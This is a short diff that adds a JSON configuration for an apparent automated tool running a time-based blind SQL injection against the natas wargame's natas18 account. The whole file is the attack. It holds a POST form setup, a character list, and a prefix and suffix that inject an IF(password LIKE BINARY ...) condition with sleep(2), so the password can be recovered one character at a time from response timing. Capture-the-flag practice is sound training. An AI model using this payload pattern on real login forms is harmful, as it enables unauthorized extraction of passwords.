@@ -1,0 +1,16 @@
+{
+    "hint":"SQL Injection",
+    "listedChar": "QWERTYUIOPASDFGHJKLLZXCVBNMqwertyuiopasdfghjklzxcvbnm0123456789",
+    "method":"POST",
+    "isFormData": true,
+    "body":{
+        "username": "",
+        "debug": "1"
+    },
+    "searchParams": ["username"],
+    "prefixValue": "natas18\" AND IF(password LIKE BINARY \"",
+    "suffixValue": "%\", sleep(2), False) and password !=\"",
+    "ongoing": true,
+    "stopOnChangeTiming": true,
+    "maxCount": 63
+}
